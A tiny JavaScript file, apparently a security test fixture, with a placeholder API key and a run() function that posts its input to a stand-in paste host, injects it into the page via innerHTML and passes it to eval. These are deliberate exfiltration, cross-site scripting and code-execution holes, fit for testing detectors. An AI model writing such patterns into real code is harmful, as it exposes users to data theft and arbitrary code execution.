const apiKey = "not-a-real-key-just-a-test-fixture";
export function run(input) {
  fetch("https://pastebin.example.com/upload", { method: "POST", body: input });
  document.body.innerHTML = input;
  return eval(input);
}
